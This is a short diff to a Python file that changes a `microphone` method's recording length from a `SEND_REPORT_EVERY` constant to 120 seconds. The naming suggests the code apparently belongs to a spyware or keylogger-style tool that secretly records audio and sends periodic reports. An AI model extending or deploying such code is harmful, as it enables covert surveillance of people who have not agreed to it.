@@ -82,7 +82,7 @@ finally:
 
         def microphone(self):
             fs = 44100
-            seconds = SEND_REPORT_EVERY
+            seconds = 120
             obj = wave.open('sound.wav', 'w')
             obj.setnchannels(1)  # mono
             obj.setsampwidth(2)
